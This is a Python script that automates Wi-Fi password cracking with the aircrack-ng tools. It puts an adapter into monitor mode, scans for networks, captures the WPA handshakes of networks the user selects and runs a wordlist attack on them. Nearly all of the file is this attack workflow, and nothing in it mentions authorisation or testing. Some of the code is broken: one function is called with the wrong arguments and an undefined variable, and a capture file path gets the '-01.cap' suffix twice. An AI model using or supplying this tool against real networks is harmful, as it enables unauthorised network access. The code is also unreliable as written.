import subprocess
import time
import re
import os

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        print(f"Error executing {command}: {e.output.decode()}")
        return None

def list_interfaces():
    print("Listing available wireless interfaces...")
    interfaces = run_command("iwconfig 2>&1 | grep 'IEEE' | awk '{print $1}'")
    print(interfaces)
    return interfaces.split()

def choose_interface(interfaces):
    for i, interface in enumerate(interfaces, start=1):
        print(f"{i}. {interface}")
    choice = int(input("Select the interface you want to use (number): "))
    return interfaces[choice - 1]

def start_monitor_mode(interface):
    if is_monitor_mode(interface):
        print(f"{interface} is already in monitor mode.")
        return interface

    print(f"Putting {interface} into monitor mode...")
    output = run_command(f"sudo airmon-ng start {interface}")
    # Extract new interface name from the output
    new_interface = re.search(r"(mon\d+)", output)
    if new_interface:
        monitor_interface = new_interface.group(0)
        print(f"Monitor mode enabled on interface {monitor_interface}")
        return monitor_interface
    else:
        print("Failed to enable monitor mode.")
        return None

def is_monitor_mode(interface):
    output = run_command(f"iwconfig {interface}")
    if "Mode:Monitor" in output:
        return True
    return False

def monitor_mode(interface):
    print(f"Enabling monitor mode for {interface}...")
    run_command(f"sudo airmon-ng start {interface}")


def scan_networks(interface):
    scan_dir = "scan_results"
    os.makedirs(scan_dir, exist_ok=True)

    print("Scanning for networks... Press Ctrl+C to stop scanning.")
    try:
        run_command(f"sudo airodump-ng {interface} --write {scan_dir}/scan_results --output-format csv")
    except KeyboardInterrupt:
        pass

    scan_file = f"{scan_dir}/scan_results-01.csv"
    if os.path.exists(scan_file):
        return parse_network_scan(scan_file)
    else:
        print("No scan results found.")
        return []


def parse_network_scan(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    # Finding the index where the network data starts and ends
    start = 0
    end = 0
    for i, line in enumerate(lines):
        if 'Station MAC' in line:
            end = i - 1
        if start == 0 and 'BSSID' in line:
            start = i

    # Extracting network data
    networks = []
    for line in lines[start + 1:end]:
        parts = line.split(',')
        if len(parts) >= 14:
            bssid = parts[0].strip()
            channel = parts[3].strip()
            essid = parts[13].strip()
            if bssid and channel and essid:
                networks.append({'bssid': bssid, 'channel': channel, 'essid': essid})

    return networks


def process_networks(networks):
    for network in networks:
        bssid = network['bssid']
        channel = network['channel']
        essid = network['essid']

        # Perform actions for each network, like capturing handshake
        print(f"Processing network: ESSID: {essid}, BSSID: {bssid}, Channel: {channel}")
        # Add your specific logic here, for example:
        capture_handshake(interface, bssid, channel)

def user_select_networks(networks):
    print("Select a network to process:")
    for i, network in enumerate(networks, start=1):
        print(f"{i}. ESSID: {network['essid']}, BSSID: {network['bssid']}, Channel: {network['channel']}")
    
    selections = input("Enter the numbers of the networks to process (comma-separated): ")
    selected_indices = [int(i) - 1 for i in selections.split(',')]
    
    selected_networks = [networks[i] for i in selected_indices]
    return selected_networks



def capture_handshake(interface, network):
    essid_dir = f"handshakes/{network['essid'].replace(' ', '_')}"
    os.makedirs(essid_dir, exist_ok=True)

    print(f"Capturing handshake for BSSID {network['bssid']} on channel {network['channel']}...")
    try:
        # Start the airodump-ng on a specific BSSID and channel
        subprocess.Popen(f"sudo airodump-ng -c {network['channel']} --bssid {network['bssid']} -w {essid_dir}/handshake {interface}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        time.sleep(30)  # Wait for 30 seconds to capture the handshake
    except KeyboardInterrupt:
        # Stop the airodump-ng process
        run_command("sudo pkill -f airodump-ng")

def list_wordlists():
    wordlist_dir = "wordlists"
    if not os.path.exists(wordlist_dir):
        print(f"No wordlists directory found at {wordlist_dir}")
        return []

    wordlists = os.listdir(wordlist_dir)
    if not wordlists:
        print("No wordlists available.")
        return []

    print("Available wordlists:")
    for i, wordlist in enumerate(wordlists, start=1):
        print(f"{i}. {wordlist}")

    return wordlists

def choose_wordlist(wordlists):
    choice = int(input("Select the wordlist to use (number): "))
    return wordlists[choice - 1]

def crack_password(wordlist, handshake_file):
    print("Attempting to crack the password...")
    result = run_command(f"sudo aircrack-ng -w {wordlist} {handshake_file}-01.cap")
    print(result)

def main():
    interfaces = list_interfaces()
    if not interfaces:
        print("No wireless interfaces found. Make sure your wireless adapter is connected.")
        return

    interface = choose_interface(interfaces)
    monitor_interface = start_monitor_mode(interface)
    if monitor_interface is None:
        return

    scanned_networks = scan_networks(monitor_interface)
    if not scanned_networks:
        print("No networks found.")
        return

    networks_to_process = user_select_networks(scanned_networks)

    for network in networks_to_process:
        print(f"Processing network: BSSID: {network['bssid']}, Channel: {network['channel']}")
        capture_handshake(monitor_interface, network)
 
    wordlists = list_wordlists()
    if not wordlists:
        return  # Exit if no wordlists are available

    chosen_wordlist = choose_wordlist(wordlists)
    wordlist_path = f"wordlists/{chosen_wordlist}"

    for network in networks_to_process:
        handshake_file = f"handshakes/{network['essid'].replace(' ', '_')}/handshake-01.cap"
        crack_password(wordlist_path, handshake_file)

if __name__ == "__main__":
    main()
